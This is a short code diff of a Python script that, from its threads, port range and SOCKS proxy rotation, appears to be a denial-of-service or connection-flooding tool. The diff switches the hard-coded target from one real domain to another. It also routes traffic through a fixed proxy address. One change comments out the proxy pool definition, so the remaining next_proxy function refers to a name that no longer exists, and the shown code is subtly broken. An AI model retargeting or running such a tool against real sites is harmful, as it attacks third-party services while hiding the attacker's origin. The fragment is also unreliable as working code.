@@ -5,7 +5,7 @@ import socks
 #from urllib.request import proxyhandler , build_opener
 from itertools import cycle
 
-tar="remitly.com"#input("Enter the target: ")
+tar="steminfinity.in"#input("Enter the target: ")
 p=20#int(input("Enter the port number: "))
 t=30#int(input("Enter number of threads: "))
 ports = range(1,p)
@@ -27,7 +27,7 @@ proxy_ip = "185.59.100.55"
 proxy_port = 1080
 
 
-proxy_pool = cycle(PROXY)
+#proxy_pool = cycle(PROXY)
 
 def next_proxy():
     return next(proxy_pool)
